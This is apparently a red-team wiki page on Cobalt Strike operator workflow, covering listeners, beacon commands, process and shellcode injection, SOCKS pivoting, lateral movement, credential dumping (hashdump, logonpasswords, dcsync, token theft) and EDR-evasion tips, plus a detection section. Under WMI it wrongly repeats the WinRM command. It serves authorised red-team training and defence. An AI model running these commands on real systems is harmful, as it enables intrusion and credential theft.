---
title: Cobalt Strike — operator workflow
slug: cobalt-strike-operations
aliases: [cs-operations, cobalt-strike-beacon, beacon-commands]
---

> **TL;DR:** Cobalt Strike is a commercial adversary-simulation platform built around Beacon — an asynchronous implant with flexible C2 channels (HTTP/S, DNS, SMB, TCP). Mastering listener configuration, beacon management, pivoting, lateral movement commands, and credential harvesting is the core loop of CRTO-level red teaming.

## What it is
Cobalt Strike (CS) is a post-exploitation framework organised around a Team Server (shared backend) and Beacon (implant). Operators interact via Aggressor Script, the GUI, or headless through the Sleep scripting language. The framework provides built-in lateral movement, credential harvesting, pivoting, and SOCKS tunnelling — all configurable through [[cobalt-strike-malleable-c2-profiles]].

## Preconditions / where it applies
- Licensed Cobalt Strike 4.x (leaked/cracked copies carry backdoors — never use in production)
- Pre-staged infrastructure: redirectors, domain categorisation, TLS certificates
- Authorised red-team engagement with rules of engagement covering C2 and lateral movement
- Operators familiar with Windows internals; most beacon commands call Win32/NT API under the hood

## Technique

### Listener types

| Listener | Transport | Use case |
|---|---|---|
| HTTP / HTTPS | TCP 80/443 | Primary egress; shaped by Malleable C2 profile |
| DNS | UDP 53 / DNS-over-HTTPS | Low-and-slow; survives restrictive egress |
| SMB (named pipe) | TCP 445 | Peer-to-peer internal pivoting; no egress needed |
| TCP (bind/reverse) | Arbitrary port | Internal pivot listener for hosts without SMB |
| Foreign | Any | Hand-off to Metasploit or other framework listeners |

SMB and TCP beacons chain through an egress beacon — they don't talk out directly. This creates a **daisy-chain** topology: workstation → SMB beacon → HTTPS egress beacon → redirector → Team Server.

```bash
# Team Server start
./teamserver <external-ip> <password> c2profiles/my-profile.profile
```

### Core beacon commands

```text
sleep 60 40          # 60s callback, 40% jitter
jobs                 # list running post-ex jobs
jobkill <jid>        # kill a running job
argue <exe> <args>   # spoof command-line arguments for child processes
blockdlls start      # enable non-Microsoft DLL blocking in child processes
inject <pid> <arch>  # inject beacon into a running process
shinject <pid> <arch> <file>  # inject raw shellcode
inline-execute <bof> # run a BOF in beacon's thread — no fork-and-run
```

`inline-execute` runs [[bof-cobalt-strike-development]] objects directly in Beacon's process and thread — no `CreateRemoteThread`, no child process. This is the lowest-noise execution path.

**Fork-and-run vs inline:** Most post-ex commands (e.g., `mimikatz`, `hashdump`) default to fork-and-run: Beacon spawns a sacrificial process (set via `spawnto`), injects the job, reads output, kills the process. Inline-execute avoids this but crashes Beacon on failure. For OPSEC: prefer inline BOFs over fork-and-run where stable BOFs exist.

### BOF (Beacon Object File) loading

```text
inline-execute /path/to/bof.o arg1 arg2
```

BOFs are position-independent COFF object files loaded and executed in Beacon's memory. No new process, no new thread (runs on Beacon's check-in thread). Community BOF collections: [TrustedSec SA](https://github.com/trustedsec/CS-Situational-Awareness-BOF), [CS-Remote-OPs](https://github.com/trustedsec/CS-Remote-OPs-BOF).

### SOCKS proxy and pivoting

```text
socks 1080                          # start SOCKS4a proxy on Team Server
socks 1080 socks5 enableNoAuth      # SOCKS5 (CS 4.8+)
rportfwd 8080 10.10.10.5 80         # reverse port forward through beacon
rportfwd_local 8443 127.0.0.1 443   # forward through operator's machine
```

Chain with `proxychains` on the operator side:

```bash
# /etc/proxychains4.conf → socks5 127.0.0.1 1080
proxychains nmap -sT -Pn -p 445,3389 10.10.10.0/24
proxychains crackmapexec smb 10.10.10.0/24
```

### Lateral movement commands

```text
# PsExec — creates a service, runs payload, deletes service
jump psexec64 <target> <smb-listener>

# WMI — spawns process via DCOM Win32_Process.Create
jump winrm64 <target> <listener>
remote-exec wmi <target> <command>

# WinRM — uses WS-Management; requires port 5985/5986
jump winrm64 <target> <listener>
remote-exec winrm <target> <command>

# Pass-the-hash then move
pth DOMAIN\user <ntlm-hash>
jump psexec64 <target> <smb-listener>
```

`jump` = deliver + execute a Beacon payload. `remote-exec` = run an arbitrary command (one-shot, no Beacon).

### Credential harvesting

```text
hashdump                    # dump SAM hashes (requires SYSTEM or admin)
logonpasswords              # Mimikatz sekurlsa::logonpasswords (fork-and-run)
dcsync DOMAIN.local         # DCSync all accounts (requires replication rights)
dcsync DOMAIN.local DOMAIN\krbtgt  # single account

# Token manipulation
steal_token <pid>           # impersonate token of running process
make_token DOMAIN\user password  # create a logon session with creds
rev2self                    # drop impersonation, return to original token
```

`dcsync` is the final-objective credential operation — with Domain Admin or the replication ACEs (`DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All`), it replicates the NTDS password data over MS-DRSR without touching `ntds.dit` on disk.

### File and payload operations

```text
upload /local/file.exe      # upload a file to beacon's CWD
download C:\target\file.db  # download from target
execute-assembly /path/to/tool.exe args  # run a .NET assembly in-memory
powershell-import /path/to/script.ps1    # import a PS module (AMSI applies)
powerpick Get-DomainUser -Identity admin # unmanaged PowerShell (no powershell.exe)
```

`execute-assembly` loads a .NET assembly via `Assembly.Load` in a sacrificial process — it's fork-and-run and still creates events, but the assembly never touches disk.

## Detection and defence
- Service creation from `psexec` leaves Event ID 7045 (System log) with a random service name and `%COMSPEC%` in the command line
- WMI lateral movement triggers Event ID 4648 (explicit logon) + WMI-Activity/Operational logs
- Named pipe beacons create pipes matching patterns configurable in the profile — defaults like `\\.\pipe\msagent_*` are widely signatured
- DCSync triggers Event ID 4662 with the replication GUIDs (`1131f6aa-*`, `1131f6ad-*`) on the Domain Controller
- SOCKS proxying creates unusual TCP fan-out from a single workstation process
- Fork-and-run leaves `CreateRemoteThread` + hollowed child process events; monitor for `svchost.exe` or `dllhost.exe` spawning with no corresponding service
- Memory scanning detects default Beacon config blocks; use [[sleep-mask-and-memory-evasion]] and Artifact Kit

## OPSEC pitfalls
- `hashdump` touches the SAM hive — Sysmon Event ID 10 on `lsass.exe` access and potential AV detection
- `logonpasswords` is fork-and-run by default; the sacrificial process accessing LSASS is a high-fidelity alert
- SMB Beacon's default pipe name is a known signature — always customise `pipename` in profile
- `argue` spoofing is visible if defenders inspect the PEB before the process modifies it; timing matters
- Avoid `jump psexec` in monitored environments — prefer WMI or WinRM which are noisier in logs but less signatured by EDR

## References
- [Cobalt Strike User Guide](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/)
- [Red Team Ops (CRTO) course — Zero-Point Security](https://training.zeropointsecurity.co.uk/courses/red-team-ops)
- [TrustedSec Situational Awareness BOFs](https://github.com/trustedsec/CS-Situational-Awareness-BOF)
- [Raphael Mudge — CS YouTube series](https://www.youtube.com/playlist?list=PL9HO6M_MU2nesxSmhJjEveFhcSkD6oeWq)

See also: [[cobalt-strike-malleable-c2-profiles]], [[bof-cobalt-strike-development]], [[c2-protocol-design]], [[sleep-mask-and-memory-evasion]], [[host-recon-tradecraft]], [[data-hunting-and-exfiltration]], [[kerberoasting]], [[dcsync-attack]], [[lateral-movement-overview]], [[token-manipulation]]
